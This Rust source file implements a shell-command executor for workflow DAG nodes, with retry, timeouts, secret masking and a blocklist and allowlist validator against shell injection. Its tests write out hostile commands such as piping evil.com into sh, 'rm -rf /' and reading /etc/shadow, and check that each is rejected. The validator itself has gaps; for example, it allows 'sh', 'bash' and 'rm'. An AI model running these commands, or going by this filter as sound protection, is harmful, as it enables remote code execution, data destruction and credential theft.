//! DAG Node Executor - Command execution with timeout and retry
//!
//! Executes individual DAG nodes as shell commands with proper error handling.

use std::collections::HashMap;
use std::process::Stdio;
use std::time::Duration;

use serde_json::Value;
use thiserror::Error;
use tokio::io::AsyncReadExt;
use tokio::process::Command;
use tokio::time::timeout;
use tracing::{debug, error, info, warn};

use crate::context_budget::apply_budget;
use crate::dag::scheduler::ReadyNode;
use crate::workflow::ContextBudget;

// ============================================================================
// Script Validation (TASK-655: Shell Injection Protection)
// ============================================================================

/// Script validation error types
#[derive(Debug, Error, Clone, PartialEq)]
pub enum ScriptValidationError {
    #[error("Script contains dangerous character: '{0}'")]
    DangerousCharacter(char),

    #[error("Script contains dangerous pattern: '{0}'")]
    DangerousPattern(String),

    #[error("Script command not in allowlist")]
    NotInAllowlist,

    #[error("Script is empty")]
    EmptyScript,
}

/// Dangerous shell characters that enable injection attacks
const DANGEROUS_CHARS: &[char] = &['|', ';', '`', '>', '<', '&'];

/// Dangerous patterns that enable command substitution or injection
const DANGEROUS_PATTERNS: &[&str] = &[
    "$(",  // Command substitution
    "${",  // Variable expansion with potential injection
    "$()", // Empty command substitution
    "eval ", // Eval command
    "exec ", // Exec command
];

/// Allowed command prefixes (allowlist approach)
const ALLOWED_PREFIXES: &[&str] = &[
    "echo ",
    "printf ",
    "eket ",
    "npm ",
    "npx ",
    "cargo ",
    "git ",
    "node ",
    "python ",
    "python3 ",
    "sh ",
    "bash ",
    "cat ",
    "ls ",
    "pwd",
    "cd ",
    "mkdir ",
    "cp ",
    "mv ",
    "rm ",
    "test ",
    "[ ",
    "exit ",
    "true",
    "false",
    "sleep ",
    "date",
    "whoami",
    "env",
    "export ",
    "rustc ",
    "rustfmt ",
];

/// Validate script for shell injection vulnerabilities
///
/// Uses a two-layer defense:
/// 1. Blocklist: Rejects scripts containing dangerous characters/patterns
/// 2. Allowlist: Only permits scripts starting with known-safe commands
///
/// # Arguments
/// * `script` - The shell script to validate
/// * `strict_allowlist` - If true, also enforce allowlist check
///
/// # Returns
/// * `Ok(())` if script is safe
/// * `Err(ScriptValidationError)` if script contains injection risks
pub fn validate_script(script: &str, strict_allowlist: bool) -> Result<(), ScriptValidationError> {
    let script = script.trim();

    // Check for empty script
    if script.is_empty() {
        return Err(ScriptValidationError::EmptyScript);
    }

    // Layer 1: Check for dangerous characters
    for c in script.chars() {
        if DANGEROUS_CHARS.contains(&c) {
            return Err(ScriptValidationError::DangerousCharacter(c));
        }
    }

    // Layer 2: Check for dangerous patterns
    for pattern in DANGEROUS_PATTERNS {
        if script.contains(pattern) {
            return Err(ScriptValidationError::DangerousPattern(pattern.to_string()));
        }
    }

    // Layer 3 (optional): Allowlist check
    if strict_allowlist {
        let script_lower = script.to_lowercase();
        let is_allowed = ALLOWED_PREFIXES
            .iter()
            .any(|prefix| script_lower.starts_with(&prefix.to_lowercase()));

        if !is_allowed {
            return Err(ScriptValidationError::NotInAllowlist);
        }
    }

    Ok(())
}

// ============================================================================
// Script Sanitization (TASK-638: Log Masking)
// ============================================================================

use once_cell::sync::Lazy;
use regex::Regex;

/// Pre-compiled sensitive patterns (TASK-657: Regex precompilation optimization)
/// Avoids compiling 5 regex patterns on every mask_sensitive() call
static SENSITIVE_PATTERNS: Lazy<Vec<Regex>> = Lazy::new(|| {
    vec![
        // Environment variable assignments
        Regex::new(r"(?i)(?:API_KEY|TOKEN|PASSWORD|SECRET|PRIVATE_KEY|ACCESS_KEY|AUTH)=\S+")
            .expect("Invalid regex: env vars"),
        // Bearer tokens
        Regex::new(r"Bearer\s+\S+").expect("Invalid regex: bearer"),
        // Basic auth
        Regex::new(r"Basic\s+[A-Za-z0-9+/=]+").expect("Invalid regex: basic auth"),
        // GitHub PAT
        Regex::new(r"ghp_[A-Za-z0-9]+").expect("Invalid regex: github pat"),
        // Slack tokens
        Regex::new(r"xoxb-[A-Za-z0-9-]+").expect("Invalid regex: slack token"),
    ]
});

/// Mask sensitive patterns in script content
fn mask_sensitive(s: &str) -> String {
    let mut result = s.to_string();
    for re in SENSITIVE_PATTERNS.iter() {
        result = re
            .replace_all(&result, |caps: &regex::Captures| {
                let m = caps.get(0).map_or("", |m| m.as_str());
                if let Some(eq_pos) = m.find('=') {
                    format!("{}***", &m[..=eq_pos])
                } else if let Some(space_pos) = m.find(' ') {
                    format!("{} ***", &m[..space_pos])
                } else {
                    "***".to_string()
                }
            })
            .to_string();
    }
    result
}

/// Sanitize script for logging: mask sensitive data and truncate
pub fn sanitize_script(script: &str, max_len: usize) -> String {
    let masked = mask_sensitive(script);
    if masked.len() > max_len {
        format!("{}...", &masked[..max_len])
    } else {
        masked
    }
}

/// Execution result for a node
#[derive(Debug, Clone)]
pub struct NodeExecutionResult {
    pub node_id: String,
    pub success: bool,
    pub exit_code: Option<i32>,
    pub stdout: String,
    pub stderr: String,
    pub error_msg: Option<String>,
    pub duration_ms: u64,
    /// Whether this was a gate node
    pub is_gate: bool,
    /// Whether gate condition passed (only meaningful if is_gate)
    pub gate_passed: bool,
}

/// Node executor configuration
#[derive(Debug, Clone)]
pub struct ExecutorConfig {
    /// Working directory for command execution
    pub working_dir: Option<String>,
    /// Environment variables to set
    pub env: HashMap<String, String>,
    /// Shell to use (default: /bin/sh)
    pub shell: String,
    /// Enable strict allowlist validation (default: false)
    /// When true, only commands starting with allowed prefixes are permitted
    pub strict_allowlist: bool,
}

impl Default for ExecutorConfig {
    fn default() -> Self {
        Self {
            working_dir: None,
            env: HashMap::new(),
            shell: "/bin/sh".to_string(),
            strict_allowlist: false,
        }
    }
}

/// DAG Node Executor
pub struct NodeExecutor {
    config: ExecutorConfig,
}

impl NodeExecutor {
    /// Create new executor with config
    pub fn new(config: ExecutorConfig) -> Self {
        Self { config }
    }

    /// Create executor with default config
    pub fn with_defaults() -> Self {
        Self::new(ExecutorConfig::default())
    }

    /// Execute a node with retry logic
    pub async fn execute(&self, node: &ReadyNode) -> NodeExecutionResult {
        let mut last_result = None;
        let mut attempt = 0;

        while attempt <= node.retry {
            if attempt > 0 {
                info!(
                    "[NodeExecutor] Retrying node {} (attempt {}/{})",
                    node.id,
                    attempt + 1,
                    node.retry + 1
                );
                // Exponential backoff: 1s, 2s, 4s...
                tokio::time::sleep(Duration::from_secs(1 << (attempt - 1))).await;
            }

            let result = self.execute_once(node).await;

            if result.success {
                return result;
            }

            last_result = Some(result);
            attempt += 1;
        }

        last_result.unwrap_or_else(|| NodeExecutionResult {
            node_id: node.id.clone(),
            success: false,
            exit_code: None,
            stdout: String::new(),
            stderr: String::new(),
            error_msg: Some("No execution attempted".to_string()),
            duration_ms: 0,
            is_gate: false,
            gate_passed: false,
        })
    }

    /// Execute a node once without retry
    async fn execute_once(&self, node: &ReadyNode) -> NodeExecutionResult {
        let start = std::time::Instant::now();

        debug!(
            "[NodeExecutor] Executing node {} with timeout {}s",
            node.id, node.timeout
        );

        let execute_future = self.run_command(&node.script);
        let timeout_duration = Duration::from_secs(node.timeout);

        match timeout(timeout_duration, execute_future).await {
            Ok(result) => {
                let duration_ms = start.elapsed().as_millis() as u64;
                match result {
                    Ok((exit_code, stdout, stderr)) => {
                        let success = exit_code == 0;
                        if success {
                            info!(
                                "[NodeExecutor] Node {} completed successfully in {}ms",
                                node.id, duration_ms
                            );
                        } else {
                            warn!(
                                "[NodeExecutor] Node {} failed with exit code {} in {}ms",
                                node.id, exit_code, duration_ms
                            );
                        }

                        NodeExecutionResult {
                            node_id: node.id.clone(),
                            success,
                            exit_code: Some(exit_code),
                            stdout,
                            stderr: stderr.clone(),
                            error_msg: if success {
                                None
                            } else {
                                Some(format!("Exit code {}: {}", exit_code, stderr))
                            },
                            duration_ms,
                            is_gate: false,
                            gate_passed: false,
                        }
                    }
                    Err(e) => {
                        error!(
                            "[NodeExecutor] Node {} execution error: {}",
                            node.id, e
                        );
                        NodeExecutionResult {
                            node_id: node.id.clone(),
                            success: false,
                            exit_code: None,
                            stdout: String::new(),
                            stderr: String::new(),
                            error_msg: Some(format!("Execution error: {}", e)),
                            duration_ms: start.elapsed().as_millis() as u64,
                            is_gate: false,
                            gate_passed: false,
                        }
                    }
                }
            }
            Err(_) => {
                error!(
                    "[NodeExecutor] Node {} timed out after {}s",
                    node.id, node.timeout
                );
                NodeExecutionResult {
                    node_id: node.id.clone(),
                    success: false,
                    exit_code: None,
                    stdout: String::new(),
                    stderr: String::new(),
                    error_msg: Some(format!("Timeout after {}s", node.timeout)),
                    duration_ms: start.elapsed().as_millis() as u64,
                    is_gate: false,
                    gate_passed: false,
                }
            }
        }
    }

    /// Run a shell command with validation
    async fn run_command(&self, script: &str) -> Result<(i32, String, String), std::io::Error> {
        // TASK-655: Validate script for shell injection
        if let Err(e) = validate_script(script, self.config.strict_allowlist) {
            error!(
                "[NodeExecutor] Script validation failed: {} - script: {}",
                e,
                sanitize_script(script, 50)
            );
            return Err(std::io::Error::new(
                std::io::ErrorKind::InvalidInput,
                format!("Script validation failed: {}", e),
            ));
        }

        let mut cmd = Command::new(&self.config.shell);
        cmd.arg("-c").arg(script);

        // Set working directory
        if let Some(ref dir) = self.config.working_dir {
            cmd.current_dir(dir);
        }

        // Set environment variables
        for (key, value) in &self.config.env {
            cmd.env(key, value);
        }

        // Capture output
        cmd.stdout(Stdio::piped());
        cmd.stderr(Stdio::piped());

        let mut child = cmd.spawn()?;

        let mut stdout = String::new();
        let mut stderr = String::new();

        if let Some(ref mut stdout_handle) = child.stdout {
            stdout_handle.read_to_string(&mut stdout).await?;
        }

        if let Some(ref mut stderr_handle) = child.stderr {
            stderr_handle.read_to_string(&mut stderr).await?;
        }

        let status = child.wait().await?;
        let exit_code = status.code().unwrap_or(-1);

        Ok((exit_code, stdout, stderr))
    }

    /// Prepare context data with budget constraints
    pub fn prepare_context(
        &self,
        upstream_context: &mut HashMap<String, Value>,
        budget: &ContextBudget,
    ) {
        apply_budget(upstream_context, budget);
    }
}

/// Dry-run executor that doesn't actually execute commands
pub struct DryRunExecutor;

impl DryRunExecutor {
    /// Simulate execution without running commands
    pub async fn execute(node: &ReadyNode) -> NodeExecutionResult {
        info!(
            "[DryRunExecutor] Would execute node {}: {}",
            node.id,
            sanitize_script(&node.script, 100)
        );

        // Simulate some execution time
        tokio::time::sleep(Duration::from_millis(100)).await;

        NodeExecutionResult {
            node_id: node.id.clone(),
            success: true,
            exit_code: Some(0),
            stdout: format!("[dry-run] {}", sanitize_script(&node.script, 100)),
            stderr: String::new(),
            error_msg: None,
            duration_ms: 100,
            is_gate: false,
            gate_passed: false,
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn make_node(id: &str, script: &str, timeout: u64) -> ReadyNode {
        ReadyNode {
            id: id.to_string(),
            script: script.to_string(),
            retry: 0,
            timeout,
            priority: 50,
            is_critical_path: false,
            deadline: None,
        }
    }

    #[tokio::test]
    async fn test_execute_success() {
        let executor = NodeExecutor::with_defaults();
        let node = make_node("TASK-001", "echo hello", 10);

        let result = executor.execute(&node).await;
        assert!(result.success);
        assert_eq!(result.exit_code, Some(0));
        assert!(result.stdout.contains("hello"));
    }

    #[tokio::test]
    async fn test_execute_failure() {
        let executor = NodeExecutor::with_defaults();
        let node = make_node("TASK-002", "exit 1", 10);

        let result = executor.execute(&node).await;
        assert!(!result.success);
        assert_eq!(result.exit_code, Some(1));
    }

    #[tokio::test]
    async fn test_execute_timeout() {
        let executor = NodeExecutor::with_defaults();
        let node = make_node("TASK-003", "sleep 10", 1);

        let result = executor.execute(&node).await;
        assert!(!result.success);
        assert!(result.error_msg.unwrap().contains("Timeout"));
    }

    #[tokio::test]
    async fn test_execute_with_retry() {
        let executor = NodeExecutor::with_defaults();
        // This will fail on first attempt but we're just testing retry logic runs
        let mut node = make_node("TASK-004", "exit 1", 10);
        node.retry = 1;

        let result = executor.execute(&node).await;
        // Still fails because command always exits 1
        assert!(!result.success);
    }

    #[tokio::test]
    async fn test_dry_run_executor() {
        let node = make_node("TASK-005", "dangerous_command", 10);

        let result = DryRunExecutor::execute(&node).await;
        assert!(result.success);
        assert!(result.stdout.contains("dry-run"));
    }

    #[tokio::test]
    async fn test_execute_with_env() {
        let mut config = ExecutorConfig::default();
        config.env.insert("MY_VAR".to_string(), "test_value".to_string());

        let executor = NodeExecutor::new(config);
        let node = make_node("TASK-006", "echo $MY_VAR", 10);

        let result = executor.execute(&node).await;
        assert!(result.success);
        assert!(result.stdout.contains("test_value"));
    }

    #[tokio::test]
    async fn test_prepare_context() {
        let executor = NodeExecutor::with_defaults();
        let mut context: HashMap<String, Value> = HashMap::new();
        context.insert(
            "tool_output_1".to_string(),
            serde_json::json!("large data"),
        );
        context.insert("user_message".to_string(), serde_json::json!("hello"));

        let budget = ContextBudget {
            exclude_tool_outputs: true,
            ..Default::default()
        };

        executor.prepare_context(&mut context, &budget);

        assert!(!context.contains_key("tool_output_1"));
        assert!(context.contains_key("user_message"));
    }

    // TASK-638: Script sanitization tests
    #[test]
    fn test_sanitize_script_truncates_long_scripts() {
        let long_script = "a".repeat(150);
        let result = sanitize_script(&long_script, 100);
        assert_eq!(result.len(), 103); // 100 + "..."
        assert!(result.ends_with("..."));
    }

    #[test]
    fn test_sanitize_script_no_truncate_short() {
        let short_script = "echo hello";
        let result = sanitize_script(short_script, 100);
        assert_eq!(result, "echo hello");
    }

    #[test]
    fn test_sanitize_script_masks_api_key() {
        let script = "curl -H API_KEY=secret123 http://api";
        let result = sanitize_script(script, 200);
        assert!(result.contains("API_KEY=***"));
        assert!(!result.contains("secret123"));
    }

    #[test]
    fn test_sanitize_script_masks_token() {
        let script = "export TOKEN=mytoken123";
        let result = sanitize_script(script, 200);
        assert!(result.contains("TOKEN=***"));
        assert!(!result.contains("mytoken123"));
    }

    #[test]
    fn test_sanitize_script_masks_bearer() {
        let script = "curl -H Authorization: Bearer eyJhbGciOiJIUzI1NiJ9 http://api";
        let result = sanitize_script(script, 200);
        assert!(result.contains("Bearer ***"));
        assert!(!result.contains("eyJhbGciOiJIUzI1NiJ9"));
    }

    #[test]
    fn test_sanitize_script_masks_github_pat() {
        let script = "git clone https://ghp_1234567890abcdefABCDEF@github.com/user/repo";
        let result = sanitize_script(script, 200);
        assert!(result.contains("***"));
        assert!(!result.contains("ghp_1234567890abcdefABCDEF"));
    }

    #[test]
    fn test_sanitize_script_masks_multiple() {
        let script = "API_KEY=key1 TOKEN=tok1 Bearer secret123";
        let result = sanitize_script(script, 200);
        assert!(result.contains("API_KEY=***"));
        assert!(result.contains("TOKEN=***"));
        assert!(result.contains("Bearer ***"));
        assert!(!result.contains("key1"));
        assert!(!result.contains("tok1"));
        assert!(!result.contains("secret123"));
    }

    // ========================================================================
    // TASK-655: Shell Injection Protection Tests
    // ========================================================================

    #[test]
    fn test_validate_script_safe_commands() {
        // Safe commands should pass
        assert!(validate_script("echo hello", false).is_ok());
        assert!(validate_script("npm run build", false).is_ok());
        assert!(validate_script("cargo test", false).is_ok());
        assert!(validate_script("git status", false).is_ok());
        assert!(validate_script("ls -la", false).is_ok());
        assert!(validate_script("pwd", false).is_ok());
        assert!(validate_script("true", false).is_ok());
        assert!(validate_script("exit 0", false).is_ok());
    }

    #[test]
    fn test_validate_script_rejects_pipe() {
        let result = validate_script("cat /etc/passwd | grep root", false);
        assert!(matches!(
            result,
            Err(ScriptValidationError::DangerousCharacter('|'))
        ));
    }

    #[test]
    fn test_validate_script_rejects_semicolon() {
        let result = validate_script("echo hello; rm -rf /", false);
        assert!(matches!(
            result,
            Err(ScriptValidationError::DangerousCharacter(';'))
        ));
    }

    #[test]
    fn test_validate_script_rejects_backtick() {
        let result = validate_script("echo `whoami`", false);
        assert!(matches!(
            result,
            Err(ScriptValidationError::DangerousCharacter('`'))
        ));
    }

    #[test]
    fn test_validate_script_rejects_redirect_output() {
        let result = validate_script("echo malicious > /etc/passwd", false);
        assert!(matches!(
            result,
            Err(ScriptValidationError::DangerousCharacter('>'))
        ));
    }

    #[test]
    fn test_validate_script_rejects_redirect_input() {
        let result = validate_script("cat < /etc/shadow", false);
        assert!(matches!(
            result,
            Err(ScriptValidationError::DangerousCharacter('<'))
        ));
    }

    #[test]
    fn test_validate_script_rejects_background() {
        let result = validate_script("malicious_script &", false);
        assert!(matches!(
            result,
            Err(ScriptValidationError::DangerousCharacter('&'))
        ));
    }

    #[test]
    fn test_validate_script_rejects_command_substitution() {
        let result = validate_script("echo $(cat /etc/passwd)", false);
        assert!(matches!(
            result,
            Err(ScriptValidationError::DangerousPattern(_))
        ));
    }

    #[test]
    fn test_validate_script_rejects_variable_expansion() {
        let result = validate_script("echo ${PATH}", false);
        assert!(matches!(
            result,
            Err(ScriptValidationError::DangerousPattern(_))
        ));
    }

    #[test]
    fn test_validate_script_rejects_eval() {
        let result = validate_script("eval malicious_code", false);
        assert!(matches!(
            result,
            Err(ScriptValidationError::DangerousPattern(_))
        ));
    }

    #[test]
    fn test_validate_script_rejects_exec() {
        let result = validate_script("exec /bin/sh", false);
        assert!(matches!(
            result,
            Err(ScriptValidationError::DangerousPattern(_))
        ));
    }

    #[test]
    fn test_validate_script_rejects_empty() {
        let result = validate_script("", false);
        assert!(matches!(result, Err(ScriptValidationError::EmptyScript)));

        let result = validate_script("   ", false);
        assert!(matches!(result, Err(ScriptValidationError::EmptyScript)));
    }

    #[test]
    fn test_validate_script_strict_allowlist() {
        // With strict allowlist, unknown commands should fail
        let result = validate_script("unknown_command arg", true);
        assert!(matches!(
            result,
            Err(ScriptValidationError::NotInAllowlist)
        ));

        // Allowed prefixes should pass
        assert!(validate_script("echo hello", true).is_ok());
        assert!(validate_script("npm install", true).is_ok());
        assert!(validate_script("cargo build", true).is_ok());
        assert!(validate_script("git push", true).is_ok());
    }

    #[test]
    fn test_validate_script_allowlist_case_insensitive() {
        // Allowlist should be case-insensitive
        assert!(validate_script("ECHO hello", true).is_ok());
        assert!(validate_script("Echo World", true).is_ok());
        assert!(validate_script("NPM run test", true).is_ok());
    }

    #[test]
    fn test_validate_script_complex_injection_attempts() {
        // Various injection attempts
        assert!(validate_script("echo hello && rm -rf /", false).is_err());
        assert!(validate_script("echo hello || malicious", false).is_err()); // Contains |
        assert!(validate_script("echo $(whoami)", false).is_err());
        assert!(validate_script("echo `id`", false).is_err());
        assert!(validate_script("cat /etc/passwd > /tmp/leak", false).is_err());
        assert!(validate_script("curl http://evil.com | sh", false).is_err());
    }

    #[tokio::test]
    async fn test_executor_rejects_injection() {
        let executor = NodeExecutor::with_defaults();
        let node = make_node("INJECT-001", "echo hello; rm -rf /", 10);

        let result = executor.execute(&node).await;
        assert!(!result.success);
        assert!(result
            .error_msg
            .unwrap()
            .contains("Script validation failed"));
    }

    #[tokio::test]
    async fn test_executor_rejects_command_substitution() {
        let executor = NodeExecutor::with_defaults();
        let node = make_node("INJECT-002", "echo $(whoami)", 10);

        let result = executor.execute(&node).await;
        assert!(!result.success);
        assert!(result
            .error_msg
            .unwrap()
            .contains("Script validation failed"));
    }

    #[tokio::test]
    async fn test_executor_with_strict_allowlist() {
        let mut config = ExecutorConfig::default();
        config.strict_allowlist = true;

        let executor = NodeExecutor::new(config);

        // Allowed command should pass
        let node = make_node("ALLOW-001", "echo hello", 10);
        let result = executor.execute(&node).await;
        assert!(result.success);

        // Unknown command should fail
        let node2 = make_node("ALLOW-002", "unknown_dangerous_cmd", 10);
        let result2 = executor.execute(&node2).await;
        assert!(!result2.success);
    }
}
